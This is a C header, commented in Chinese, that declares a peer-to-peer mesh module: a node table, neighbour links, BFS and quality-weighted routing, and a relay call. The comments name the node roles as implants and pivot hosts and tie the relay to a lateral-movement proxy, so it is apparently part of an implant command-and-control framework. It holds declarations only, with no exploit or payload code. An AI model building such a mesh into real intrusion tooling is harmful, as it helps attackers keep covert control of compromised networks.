#ifndef P2P_H
#define P2P_H

#include <stddef.h>
#include <stdint.h>

/*
 * 14_p2p —— P2P 网格：节点表 + 邻居图 + 路径路由 + 中继转发
 *
 * 分层约定（避免与 08_lateral 职责重叠）：
 *   本模块 = 节点管理 + 消息路由（控制面）
 *   08_lateral/proxy.c = 字节级双工转发（数据面），本模块直接调用，不重复实现
 */

#define P2P_NODE_ID_LEN   16
#define P2P_MAX_NODES     64
#define P2P_MAX_NEIGHBORS  8
#define P2P_ALIAS_LEN     32
#define P2P_HOST_LEN      64
#define P2P_MAX_HOPS      16

typedef enum {
    P2P_ROLE_ENDPOINT = 0,   /* 植入体，只发起，不转发 */
    P2P_ROLE_EDGE     = 1,   /* 边缘跳板，对外可达 */
    P2P_ROLE_CORE     = 2    /* 核心节点，汇聚 */
} p2p_role_t;

typedef enum {
    P2P_OK           =   0,
    P2P_ERR_ARGS     =  -1,
    P2P_ERR_NOTFOUND =  -3,
    P2P_ERR_FULL     =  -4,
    P2P_ERR_EXISTS   =  -5,
    P2P_ERR_NOLINK   =  -6,
    P2P_ERR_NOROUTE  =  -7,
    P2P_ERR_UNREACH  =  -8
} p2p_err_t;

typedef struct {
    uint8_t   id[P2P_NODE_ID_LEN];
    char      alias[P2P_ALIAS_LEN];
    p2p_role_t role;
    char      host[P2P_HOST_LEN];
    uint16_t  port;
    int       alive;                                  /* 0 = 故障，不参与路由 */
    uint8_t   neighbors[P2P_MAX_NEIGHBORS][P2P_NODE_ID_LEN];
    int       n_neighbors;

    /* 链路质量：与 neighbors[k] 一一对应的边度量（无向边，双向同步写入） */
    uint32_t  nbr_rtt[P2P_MAX_NEIGHBORS];    /* RTT 毫秒，0 = 未测量 */
    uint32_t  nbr_ok[P2P_MAX_NEIGHBORS];     /* 成功计数 */
    uint32_t  nbr_fail[P2P_MAX_NEIGHBORS];   /* 失败计数（丢包惩罚依据） */
} p2p_node_t;

typedef struct {
    p2p_node_t nodes[P2P_MAX_NODES];
    int        n_nodes;
} p2p_mesh_t;

const char *p2p_errstr(int e);

/* ---- 节点管理 ---- */
int  p2p_mesh_init(p2p_mesh_t *m);
int  p2p_node_add(p2p_mesh_t *m, const uint8_t *id, p2p_role_t role,
                  const char *alias, const char *host, uint16_t port);
int  p2p_node_del(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_find(const p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_mark_dead(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_mark_alive(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_count(const p2p_mesh_t *m, p2p_role_t role);

/* ---- 邻居关系（无向，双向写入） ---- */
int  p2p_neighbor_link(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);
int  p2p_neighbor_unlink(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);
int  p2p_neighbor_has(const p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);

/* ---- 路由：BFS 最短路径，跳过故障节点 ----
 * path[] 输出从 from 的下一跳开始（不含 from），长度写入 n_hop。
 * 返回 P2P_OK 或 P2P_ERR_NOROUTE。 */
int  p2p_route_path(const p2p_mesh_t *m, const uint8_t *from, const uint8_t *dst,
                    uint8_t path[][P2P_NODE_ID_LEN], int max_hops, int *n_hop);

/* ---- 链路质量度量（按邻居边，无向，双向同步） ----
 * rtt_ms 为往返时延；ok/fail 为成功/失败计数，供丢包惩罚。
 * 度量数组与 neighbors[k] 同下标，任何增删边都必须同步维护三者。 */
int  p2p_link_set_rtt(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b, uint32_t rtt_ms);
int  p2p_link_note(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b, int ok);
int  p2p_link_metrics(const p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                      uint32_t *rtt_ms, uint32_t *ok, uint32_t *fail);

/* ---- 路由：Dijkstra 按链路质量选路（RTT + 失败惩罚） ----
 * 与 p2p_route_path（BFS 最少跳数）并存：
 *   代价相同时 QoS 退化为最少跳；时延/丢包差异大时 QoS 会绕开劣质链路。 */
int  p2p_route_path_qos(const p2p_mesh_t *m, const uint8_t *from, const uint8_t *dst,
                        uint8_t path[][P2P_NODE_ID_LEN], int max_hops, int *n_hop);

/* ---- 数据面：委托 08_lateral 的 poll 双工中继 ----
 * idle_ms <= 0 表示无超时。 */
int  p2p_relay(int cfd, int tfd, int idle_ms);

#endif /* P2P_H */
